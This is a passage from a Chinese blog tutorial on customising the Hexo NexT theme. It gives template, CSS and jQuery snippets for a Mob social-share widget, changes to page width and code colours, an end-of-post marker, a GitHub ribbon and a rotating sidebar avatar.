class="string">********</span></span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>Step3、在<code>next/layout/_partials/share/</code>里面添加<code>mob_share.swig</code>：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--MOB SHARE BEGIN--&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"-hoofoo-share-title"</span>&gt;</span>分享到：<span class="tag">&lt;/<span class="name">div</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"-hoofoo-share-buttons"</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"-mob-share-weibo -hoofoo-share-weibo -hoofoo-share-ui-button"</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-weibo"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"-mob-share-weixin -hoofoo-share-weixin -hoofoo-share-ui-button"</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-weixin"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"-mob-share-qq -hoofoo-share-qq -hoofoo-share-ui-button"</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-qq"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"-mob-share-twitter -hoofoo-share-twitter -hoofoo-share-ui-button"</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-twitter"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"-hoofoo-share-more -hoofoo-share-ui-button -mob-share-open"</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-ellipsis-h"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"-mob-share-ui"</span> <span class="attr">style</span>=<span class="string">"display: none"</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"-mob-share-list"</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"-mob-share-weibo"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>新浪微博<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"-mob-share-weixin"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>微信<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"-mob-share-qzone"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>QQ空间<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"-mob-share-qq"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>QQ好友<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"-mob-share-tencentweibo"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>腾讯微博<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"-mob-share-renren"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>人人网<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"-mob-share-kaixin"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>开心网<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"-mob-share-douban"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>豆瓣<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"-mob-share-youdao"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>有道云笔记<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"-mob-share-mingdao"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>明道<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"-mob-share-pengyou"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>朋友网<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"-mob-share-facebook"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>Facebook<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"-mob-share-twitter"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>Twitter<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"-mob-share-pocket"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>Pocket<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"-mob-share-google"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>Google+<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"-mob-share-tumblr"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>Tumblr<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"-mob-share-instapaper"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>Instapaper<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"-mob-share-linkedin"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>Linkedin<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;/<span class="name">ul</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"-mob-share-close"</span>&gt;</span>取消<span class="tag">&lt;/<span class="name">div</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"-mob-share-ui-bg"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">id</span>=<span class="string">"-mob-share"</span> <span class="attr">src</span>=<span class="string">"[http://f1.webshare.mob.com/code/mob-share.js?appkey=&#123;&#123;theme.mob_share.appkey](http://f1.webshare.mob.com/code/mob-share.js?appkey=&#123;&#123;theme.mob_share.appkey)&#125;&#125;"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </span><br><span class="line"><span class="comment">&lt;!--MOB SHARE END--&gt;</span></span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>Step4、在<code>next/layout/post.swig</code>中添加条件分支：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> theme.jiathis %&#125;  </span><br><span class="line"> &#123;% include '_partials/share/jiathis.swig' %&#125;  </span><br><span class="line"> &#123;% elseif theme.baidushare %&#125;  </span><br><span class="line"> &#123;% include '_partials/share/baidushare.swig' %&#125;  </span><br><span class="line"> &#123;% elseif theme.add_this_id %&#125;  </span><br><span class="line"> &#123;% include '_partials/share/add-this.swig' %&#125;  </span><br><span class="line"> &#123;% elseif theme.duoshuo_shortname <span class="keyword">and</span> theme.duoshuo_share %&#125;  </span><br><span class="line"> &#123;% include '_partials/share/duoshuo_share.swig' %&#125;  </span><br><span class="line"> &#123;% elseif theme.mob_share.enable %&#125;  </span><br><span class="line"> &#123;% include '_partials/share/mob_share.swig' %&#125;  </span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>Step5、在<code>next/source/css/_common/components/third-party/</code>(没有自行创建)里添加样式文件<code>mob_share.styl</code>：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.-hoofoo-share-buttons</span>&#123;  </span><br><span class="line"> <span class="attribute">display</span>: inline-block;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="selector-class">.-hoofoo-share-title</span>&#123;  </span><br><span class="line"> <span class="attribute">font-size</span>: <span class="number">1.1em</span>;  </span><br><span class="line"> <span class="attribute">font-weight</span>: <span class="number">200</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="selector-class">.-hoofoo-share-ui-button</span>&#123;  </span><br><span class="line"> <span class="attribute">cursor</span>: pointer;  </span><br><span class="line"> <span class="attribute">background-color</span>: <span class="number">#555</span>;  </span><br><span class="line"> <span class="attribute">color</span>: <span class="number">#fff</span>;  </span><br><span class="line"> <span class="attribute">font-size</span>: <span class="number">24px</span>;  </span><br><span class="line"> <span class="attribute">line-height</span>: <span class="number">40px</span>;  </span><br><span class="line"> <span class="attribute">width</span>: <span class="number">40px</span>;  </span><br><span class="line"> <span class="attribute">height</span>: <span class="number">40px</span>;  </span><br><span class="line"> <span class="attribute">margin</span>: <span class="number">10px</span>;  </span><br><span class="line"> <span class="attribute">border-radius</span>: <span class="number">25px</span>;  </span><br><span class="line"> <span class="attribute">float</span>: left;  </span><br><span class="line"> <span class="attribute">transition</span>: background <span class="number">0.4s</span>;  </span><br><span class="line"> <span class="attribute">-moz-transition</span>: background <span class="number">0.4s</span>;    <span class="comment">/* Firefox 4 */</span>  </span><br><span class="line"> <span class="attribute">-webkit-transition</span>: background <span class="number">0.4s</span>;    <span class="comment">/* Safari 和 Chrome */</span>  </span><br><span class="line"> <span class="attribute">-o-transition</span>: background <span class="number">0.4s</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="selector-class">.-hoofoo-share-weibo</span><span class="selector-pseudo">:hover</span>&#123;  </span><br><span class="line"> <span class="attribute">background-color</span>: <span class="number">#cf3f41</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="selector-class">.-hoofoo-share-weixin</span><span class="selector-pseudo">:hover</span>&#123;  </span><br><span class="line"> <span class="attribute">background-color</span>: <span class="number">#18a01a</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="selector-class">.-hoofoo-share-qq</span><span class="selector-pseudo">:hover</span>&#123;  </span><br><span class="line"> <span class="attribute">background-color</span>: <span class="number">#950c0c</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="selector-class">.-hoofoo-share-twitter</span><span class="selector-pseudo">:hover</span>&#123;  </span><br><span class="line"> <span class="attribute">background-color</span>: <span class="number">#2ab3e6</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="selector-class">.-hoofoo-share-more</span><span class="selector-pseudo">:hover</span>&#123;  </span><br><span class="line"> <span class="attribute">background-color</span>: <span class="number">#777</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="selector-class">.-mob-share-weixin-qrcode-content</span>&#123;  </span><br><span class="line"> <span class="attribute">border-radius</span>: <span class="number">4px</span>;  </span><br><span class="line"> <span class="attribute">-webkit-box-shadow</span>: <span class="number">0</span> <span class="number">10px</span> <span class="number">25px</span> <span class="built_in">rgba</span>(0, 0, 0, 0.5);  </span><br><span class="line"> <span class="attribute">-moz-box-shadow</span>: <span class="number">0</span> <span class="number">10px</span> <span class="number">25px</span> <span class="built_in">rgba</span>(0, 0, 0, 0.5);  </span><br><span class="line"> <span class="attribute">-o-box-shadow</span>: <span class="number">0</span> <span class="number">10px</span> <span class="number">25px</span> <span class="built_in">rgba</span>(0, 0, 0, 0.5);  </span><br><span class="line"> <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">10px</span> <span class="number">25px</span> <span class="built_in">rgba</span>(0, 0, 0, 0.5);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="selector-class">.-mob-share-weixin-qrcode</span>&#123;  </span><br><span class="line"> <span class="attribute">margin</span>: <span class="number">5%</span> <span class="meta">!important</span>;  </span><br><span class="line"> <span class="attribute">width</span>: <span class="number">90%</span> <span class="meta">!important</span>;  </span><br><span class="line"> <span class="attribute">height</span>: auto <span class="meta">!important</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="selector-class">.-mob-share-weixin-qrcode-close</span> &#123;  </span><br><span class="line"> background-image: url('/lib/fancybox/source/fancybox_sprite.png') !important;//因为兼容问题把vendor改成了lib，根据自己的路径修改  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="selector-class">.-mob-share-weixin-qrcode-close</span> &#123;  </span><br><span class="line"> <span class="attribute">overflow</span>: hidden;  </span><br><span class="line"> <span class="attribute">line-height</span>: <span class="number">100px</span> <span class="meta">!important</span>;  </span><br><span class="line"> <span class="attribute">position</span>: absolute <span class="meta">!important</span>;  </span><br><span class="line"> <span class="attribute">top</span>: -<span class="number">18px</span> <span class="meta">!important</span>;  </span><br><span class="line"> <span class="attribute">right</span>: -<span class="number">18px</span> <span class="meta">!important</span>;  </span><br><span class="line"> <span class="attribute">width</span>: <span class="number">36px</span> <span class="meta">!important</span>;  </span><br><span class="line"> <span class="attribute">height</span>: <span class="number">36px</span> <span class="meta">!important</span>;  </span><br><span class="line"> <span class="attribute">cursor</span>: pointer <span class="meta">!important</span>;  </span><br><span class="line"> <span class="attribute">z-index</span>: <span class="number">8040</span> <span class="meta">!important</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="comment">/*Retina graphics!*/</span>  </span><br><span class="line">@<span class="keyword">media</span> only screen and (-webkit-min-device-pixel-ratio: <span class="number">1.5</span>),  </span><br><span class="line"> only screen and (min--moz-device-pixel-ratio: <span class="number">1.5</span>),  </span><br><span class="line"> only screen and (min-device-pixel-ratio: <span class="number">1.5</span>)&#123;  </span><br><span class="line"> <span class="selector-class">.-mob-share-weixin-qrcode-close</span> &#123;  </span><br><span class="line"> background-image: url('/lib/fancybox/source/fancybox_sprite@2x.png') !important;//因为兼容问题把vendor改成了lib，根据自己的路径修改  </span><br><span class="line"> <span class="selector-tag">background-size</span>: 44<span class="selector-tag">px</span> 152<span class="selector-tag">px</span> !<span class="selector-tag">important</span>; <span class="comment">/*The size of the normal image, half the size of the hi-res image*/</span>  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="selector-class">.-mob-share-close</span>&#123;  </span><br><span class="line"> <span class="attribute">height</span>: <span class="number">4em</span> <span class="meta">!important</span>;  </span><br><span class="line"> <span class="attribute">font-size</span>: <span class="number">0.8em</span> <span class="meta">!important</span>;  </span><br><span class="line"> <span class="attribute">line-height</span>: <span class="number">4em</span> <span class="meta">!important</span>;  </span><br><span class="line"> <span class="attribute">background</span>: <span class="number">#555</span> <span class="meta">!important</span>;  </span><br><span class="line"> <span class="attribute">color</span>: <span class="number">#fff</span> <span class="meta">!important</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>Step6、同一目录下的 <code>third-party.styl</code> 中添加：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@import "mob_share";</span></span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>Step7、在<code>next/layout/_scripts/third-party/</code>里添加脚本文件<code>mob_share.swig</code>：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> theme.mob_share.enable %&#125;  </span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;  </span><br><span class="line"> <span class="comment">//微信二维码点击背景关闭  </span></span><br><span class="line"> $(<span class="string">'body'</span>).delegate(<span class="string">'.-mob-share-weixin-qrcode-bg'</span>,<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line"> $(<span class="string">".-mob-share-weixin-qrcode-close"</span>).trigger(<span class="string">"click"</span>);  </span><br><span class="line"> &#125;);   </span><br><span class="line">&lt;<span class="regexp">/script&gt;  </span></span><br><span class="line"><span class="regexp">&#123;% endif %&#125;</span></span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>Step8、在<code>next/layout/_layout.swig</code>的<code>body</code>标签结束前添加：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% include '_scripts/third-party/mob_share.swig' %&#125;</span><br></pre></td></tr></table></figure></p></blockquote><h3 id="修改文章页宽"><a href="#修改文章页宽" class="headerlink" title="修改文章页宽"></a>修改文章页宽</h3><blockquote><p>打开<code>themes/next/source/css/_variables/base.styl</code>，找到以下字段并修改为合适的宽度：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$content-desktop-large = 1000px</span><br></pre></td></tr></table></figure></p></blockquote><h3 id="修改小型代码块颜色"><a href="#修改小型代码块颜色" class="headerlink" title="修改小型代码块颜色"></a>修改小型代码块颜色</h3><blockquote><p>修改<code>\themes\next\source\css\ _variables\base.styl</code>文件，加入自定义颜色：<br><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">$black-deep</span> <span class="string">=</span> <span class="comment">#222  </span></span><br><span class="line"><span class="string">$red</span> <span class="string">=</span> <span class="comment">#ff2a2a  </span></span><br><span class="line"><span class="string">$blue-bright</span> <span class="string">=</span> <span class="comment">#87daff  </span></span><br><span class="line"><span class="string">$blue</span> <span class="string">=</span> <span class="comment">#0684bd  </span></span><br><span class="line"><span class="string">$blue-deep</span> <span class="string">=</span> <span class="comment">#262a30  </span></span><br><span class="line"><span class="string">$orange</span> <span class="string">=</span> <span class="comment">#fc6423  </span></span><br><span class="line"><span class="string">//</span> <span class="string">下面是我自定义的颜色</span>  </span><br><span class="line"><span class="string">$my-code-foreground</span> <span class="string">=</span> <span class="comment">#dd0055 // 用``围出的代码块字体颜色  </span></span><br><span class="line"><span class="string">$my-code-background</span> <span class="string">=</span> <span class="comment">#eee // 用``围出的代码块背景颜色</span></span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>修改<code>$code-background</code>和<code>$code-foreground</code>的值：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// Code &amp; Code Blocks // 用``围出的代码块 // --------------------------------------------------   </span><br><span class="line">$code-font-family               = $font-family-monospace   </span><br><span class="line">$code-font-size                 = 15px   </span><br><span class="line">$code-background                = $my-code-background   </span><br><span class="line">$code-foreground                = $my-code-foreground   </span><br><span class="line">$code-border-radius             = 4px</span><br></pre></td></tr></table></figure></p></blockquote><h3 id="添加文章结束标记"><a href="#添加文章结束标记" class="headerlink" title="添加文章结束标记"></a>添加文章结束标记</h3><blockquote><p>在<code>themes/next/layout/_macro/post.swig</code>中，在<code>wechat-subscriber.swig</code>之前添加如下代码：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"text-align:center;color: #ccc;font-size:14px;"</span>&gt;</span>---------------- The End ----------------<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p></blockquote><h3 id="添加Fork-me-on-GitHub"><a href="#添加Fork-me-on-GitHub" class="headerlink" title="添加Fork me on GitHub"></a>添加Fork me on GitHub</h3><blockquote><p>去网址<em><a href="https://github.com/blog/273-github-ribbons" target="_blank" rel="noopener">https://github.com/blog/273-github-ribbons</a></em>挑选自己喜欢的样式，并复制代码，添加到<code>themes\next\layout\_layout.swig</code>的<code>body</code>标签之内即可<br><strong>记得把里面的url换成自己的!</strong></p></blockquote><h3 id="把侧边栏头像变成圆形，并且鼠标停留在上面发生旋转效果"><a href="#把侧边栏头像变成圆形，并且鼠标停留在上面发生旋转效果" class="headerlink" title="把侧边栏头像变成圆形，并且鼠标停留在上面发生旋转效果"></a>把侧边栏头像变成圆形，并且鼠标停留在上面发生旋转效果</h3><blockquote><p>修改<code>themes\next\source\css\_common\components\sidebar\sidebar-author.styl</code>：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.site-author-image</span> &#123;  </span><br><span class="line">  </span><br><span class="line"> <span class="attribute">display</span>: block;  </span><br><span class="line"> <span class="attribute">margin</span>: <span class="number">0</span> auto;  </span><br><span class="line"> <span class="attribute">padding</span>: $site-author-image-padding;  </span><br><span class="line"> <span class="attribute">max-width</span>: $site-author-image-width;  </span><br><span class="line"> <span class="attribute">height</span>: $site-author-image-height;  </span><br><span class="line"> <span class="attribute">border</span>: site-author-image-border-color;  </span><br><span class="line">  </span><br><span class="line"> <span class="comment">/* start*/</span>  </span><br><span class="line"> <span class="attribute">border-radius</span>: <span class="number">50%</span>  </span><br><span class="line"> webkit-transition: <span class="number">1.4s</span> all;  </span><br><span class="line"> <span class="attribute">moz-transition</span>: <span class="number">1.4s</span> all;  </span><br><span class="line"> <span class="attribute">ms-transition</span>: <span class="number">1.4s</span> all;  </span><br><span class="line"> <span class="attribute">transition</span>: <span class="number">1.4s</span> all;  </span><br><span class="line"> <span class="comment">/* end */</span>  </span><br><span class="line">  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">/* start */</span>  </span><br><span class="line"><span class="selector-class">.site-author-image</span><span class="selector-pseudo">:hover</span> &#123;  </span><br><span class="line">  </span><br><span class="line"> <span class="attribute">background-color</span>: <span class="number">#55DAE1</span>;  </span><br><span class="line"> <span class="attribute">webkit-transform</span>: <span class="built_in">rotate</span>(360deg) <span class="built_in">scale</span>(1.1);  </span><br><span class="line"> <span class="attribute">moz-transform</span>: <span class="built_in">rotate</span>(360deg) <span class="built_in">scale</span>(1.1);  </span><br><span class="line"> <span class="attribute">ms-transform</span>: <span class="built_in">rotate</span>(360deg) <span class="built_in">scale</span>(1.1);  </span><br><span class="line"> <span class="attribute">transform</span>: <span class="built_in">rotate</span>(360deg) <span class="built_in">scale</span>(1.1);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="comment">/* end */</span></span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p><strong>注</strong>：如果图片是扁的，自己换分辨率低的图片 </p></blockquote><h3 id="侧栏添加音乐"><a href="#侧栏添加音乐" class="headerlink" 